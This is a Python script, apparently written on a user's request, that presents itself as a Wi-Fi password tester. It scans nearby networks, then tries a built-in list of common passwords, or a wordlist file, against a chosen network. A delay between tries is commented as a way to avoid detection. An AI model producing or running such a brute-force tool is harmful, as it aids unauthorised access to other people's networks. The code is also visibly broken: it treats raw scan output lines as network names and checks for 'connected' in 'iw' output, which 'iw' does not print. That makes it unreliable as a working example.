import os
import subprocess
import time

#---------------------[COLORS]---------------------#
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
B = '\033[1;34m'  # Blue
C = '\033[1;36m'  # Cyan
P = '\033[1;35m'  # Purple
END = '\033[0m'   # Reset

#---------------------[LOGO]---------------------#
logo = f"""
{C}=========================================   {END}
{G}[+] TOOL:{Y} WIFI PASSWORD TESTER {END}
{G}[+] VERSION:{Y} CUSTOM DESIGN {END}
{G}[+] AUTHOR:{Y} USER-REQUESTED {END}
{C}=========================================   {END}
{P}      _______              _______      {END}
{P}     /       \            /       \     {END}
{B}    /         \__________/         \    {END}
{B}   |  ________  |  o o o  |  ________|   {END}
{B}   | /        \ |   ___   | /        \   {END}
{R}   |/__________\|__________|/__________\|  {END}
{C}=========================================   {END}
"""

#---------------------[PASSWORD CRACK FUNCTION]---------------------#
def crack_wifi(network_name, passwords):
    print(f"{Y}[+] Testing network: {network_name}{END}")
    
    for password in passwords:
        print(f"{B}[TESTING] {password}{END}")
        result = subprocess.run(["iw", "dev", "wlan0", "connect", network_name, "key", password],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        if "connected" in result.stdout.decode():
            print(f"{G}[SUCCESS] Password found: {password}{END}")
            return True
        else:
            time.sleep(1)  # Add delay to avoid detection
    print(f"{R}[FAILED] Could not find password for {network_name}{END}")
    return False

#---------------------[SCAN NETWORK FUNCTION]---------------------#
def scan_networks():
    print(f"{Y}[+] Scanning for Wi-Fi networks...{END}")
    networks = subprocess.run(["iw", "dev", "wlan0", "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    networks_list = networks.stdout.decode().split("\n")
    
    if len(networks_list) == 0 or all(not network.strip() for network in networks_list):
        print(f"{R}[ERROR] No networks found! Retrying...{END}")
        time.sleep(5)  # Wait for 5 seconds before retrying
        return None
    
    # Filter out any empty strings
    networks_list = [network.strip() for network in networks_list if network.strip()]
    return networks_list

#---------------------[MAIN FUNCTION]---------------------#
def main():
    os.system("clear")
    print(logo)
    
    # اسکن شبکه‌ها
    networks_list = None
    while not networks_list:
        networks_list = scan_networks()
    
    # نمایش لیست شبکه‌ها
    print(f"\n{B}[AVAILABLE NETWORKS]{END}")
    for idx, network in enumerate(networks_list, start=1):
        print(f"{G}[{idx}] {network}{END}")
    
    choice = int(input(f"\n{C}[?] Select network to test (e.g., 1): {END}")) - 1
    network_name = networks_list[choice]

    # انتخاب نوع پسورد
    choice = input(f"\n{C}[?] Select password source (1) List from file (2) Default list: {END}")
    
    if choice == '1':  # پسورد از فایل
        password_file = input(f"{C}[?] Enter path to password list (e.g., passwords.txt): {END}")
        if not os.path.exists(password_file):
            print(f"{R}[ERROR] Password file not found!{END}")
            return
        with open(password_file, "r") as file:
            passwords = file.readlines()
        passwords = [password.strip() for password in passwords]  # حذف فضاهای اضافی
    elif choice == '2':  # پسورد پیش‌فرض (لیست بزرگ)
        passwords = [
            "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123", "letmein", "1q2w3e4r",
            "admin", "welcome", "sunshine", "iloveyou", "princess", "password1", "qwerty123", "qwertyuiop", 
            "111111", "123123", "qwertyuiopasdf", "trustno1", "dragon", "myspace1", "football", "1234", "baseball",
            "superman", "shadow", "master", "ashley", "michael", "jessica", "football1", "soccer", "hannah", 
            "jordan", "hunter", "starwars", "password123", "123qwe", "sunshine1", "monkey", "letmein123", "monkey123",
            "1qaz2wsx", "qazwsx", "123qweasd", "superman123", "qwerty1234", "letmein1234", "lovely", "password1234"
        ]
    else:
        print(f"{R}[ERROR] Invalid choice!{END}")
        return

    # شروع کرک
    crack_wifi(network_name, passwords)

if __name__ == "__main__":
    main()